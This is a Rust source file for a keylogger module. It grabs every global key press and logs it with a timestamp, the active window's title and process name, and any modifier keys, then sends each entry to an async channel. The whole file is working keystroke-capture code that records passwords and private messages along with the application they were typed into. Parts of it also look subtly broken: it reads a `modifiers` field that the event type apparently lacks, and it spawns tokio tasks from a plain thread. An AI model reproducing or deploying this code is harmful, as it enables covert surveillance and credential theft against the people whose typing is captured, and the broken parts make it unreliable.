use active_win_pos_rs::get_active_window;
use chrono::Utc;
use log::{error, info};
use rdev::{grab, Event, EventType, Key};
use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeystrokeLog {
    pub timestamp: String,
    pub window_title: String,
    pub window_process_name: String,
    pub keystroke: String,
    pub modifier_keys: Vec<String>,
}

pub struct KeyLogger {
    is_running: Arc<Mutex<bool>>,
    log_sender: mpsc::Sender<KeystrokeLog>,
}

impl KeyLogger {
    pub fn new(log_sender: mpsc::Sender<KeystrokeLog>) -> Self {
        KeyLogger {
            is_running: Arc::new(Mutex::new(false)),
            log_sender,
        }
    }

    pub fn start(&self) -> Result<(), String> {
        let mut is_running = self.is_running.lock().unwrap();
        if *is_running {
            return Ok(());
        }
        *is_running = true;
        drop(is_running);

        let is_running = Arc::clone(&self.is_running);
        let sender = self.log_sender.clone();

        // Start capturing in a separate thread
        std::thread::spawn(move || {
            let callback = move |event: Event| {
                if !*is_running.lock().unwrap() {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::Interrupted,
                        "Keylogger stopped",
                    ));
                }

                if let EventType::KeyPress(key) = event.event_type {
                    // Get active window information
                    match get_active_window() {
                        Ok(window) => {
                            let window_title = window.title;
                            let window_process_name = window.app_name;

                            // Create log entry
                            let log = KeystrokeLog {
                                timestamp: Utc::now().to_rfc3339(),
                                window_title,
                                window_process_name,
                                keystroke: format_key(key),
                                modifier_keys: get_modifier_keys(&event),
                            };

                            // Send log entry to channel
                            let sender_clone = sender.clone();
                            tokio::spawn(async move {
                                if let Err(e) = sender_clone.send(log).await {
                                    error!("Failed to send keystroke log: {}", e);
                                }
                            });
                        }
                        Err(e) => {
                            error!("Failed to get active window: {}", e);
                        }
                    }
                }

                Ok(())
            };

            if let Err(e) = grab(callback) {
                error!("Failed to grab keyboard events: {}", e);
            }
        });

        info!("Keylogger started");
        Ok(())
    }

    pub fn stop(&self) {
        let mut is_running = self.is_running.lock().unwrap();
        *is_running = false;
        info!("Keylogger stopped");
    }
}

fn format_key(key: Key) -> String {
    match key {
        Key::BackQuote => "`".to_string(),
        Key::Num1 => "1".to_string(),
        Key::Num2 => "2".to_string(),
        Key::Num3 => "3".to_string(),
        Key::Num4 => "4".to_string(),
        Key::Num5 => "5".to_string(),
        Key::Num6 => "6".to_string(),
        Key::Num7 => "7".to_string(),
        Key::Num8 => "8".to_string(),
        Key::Num9 => "9".to_string(),
        Key::Num0 => "0".to_string(),
        Key::Minus => "-".to_string(),
        Key::Equal => "=".to_string(),
        Key::Q => "q".to_string(),
        Key::W => "w".to_string(),
        Key::E => "e".to_string(),
        Key::R => "r".to_string(),
        Key::T => "t".to_string(),
        Key::Y => "y".to_string(),
        Key::U => "u".to_string(),
        Key::I => "i".to_string(),
        Key::O => "o".to_string(),
        Key::P => "p".to_string(),
        Key::LeftBracket => "[".to_string(),
        Key::RightBracket => "]".to_string(),
        Key::BackSlash => "\\".to_string(),
        Key::A => "a".to_string(),
        Key::S => "s".to_string(),
        Key::D => "d".to_string(),
        Key::F => "f".to_string(),
        Key::G => "g".to_string(),
        Key::H => "h".to_string(),
        Key::J => "j".to_string(),
        Key::K => "k".to_string(),
        Key::L => "l".to_string(),
        Key::SemiColon => ";".to_string(),
        Key::Quote => "'".to_string(),
        Key::Z => "z".to_string(),
        Key::X => "x".to_string(),
        Key::C => "c".to_string(),
        Key::V => "v".to_string(),
        Key::B => "b".to_string(),
        Key::N => "n".to_string(),
        Key::M => "m".to_string(),
        Key::Comma => ",".to_string(),
        Key::Dot => ".".to_string(),
        Key::Slash => "/".to_string(),
        Key::Return => "<Return>".to_string(),
        Key::Tab => "<Tab>".to_string(),
        Key::Space => "<Space>".to_string(),
        Key::BackSpace => "<Backspace>".to_string(),
        Key::Escape => "<Escape>".to_string(),
        Key::CapsLock => "<CapsLock>".to_string(),
        Key::Alt => "<Alt>".to_string(),
        Key::ControlLeft => "<ControlLeft>".to_string(),
        Key::ControlRight => "<ControlRight>".to_string(),
        Key::ShiftLeft => "<ShiftLeft>".to_string(),
        Key::ShiftRight => "<ShiftRight>".to_string(),
        Key::MetaLeft => "<MetaLeft>".to_string(),
        Key::MetaRight => "<MetaRight>".to_string(),
        Key::Delete => "<Delete>".to_string(),
        Key::Home => "<Home>".to_string(),
        Key::End => "<End>".to_string(),
        Key::PageUp => "<PageUp>".to_string(),
        Key::PageDown => "<PageDown>".to_string(),
        Key::UpArrow => "<UpArrow>".to_string(),
        Key::DownArrow => "<DownArrow>".to_string(),
        Key::LeftArrow => "<LeftArrow>".to_string(),
        Key::RightArrow => "<RightArrow>".to_string(),
        _ => format!("<{:?}>", key),
    }
}

fn get_modifier_keys(event: &Event) -> Vec<String> {
    let mut modifiers = Vec::new();
    
    if event.modifiers.shift {
        modifiers.push("Shift".to_string());
    }
    if event.modifiers.ctrl {
        modifiers.push("Ctrl".to_string());
    }
    if event.modifiers.alt {
        modifiers.push("Alt".to_string());
    }
    if event.modifiers.meta {
        modifiers.push("Meta".to_string());
    }
    
    modifiers
} 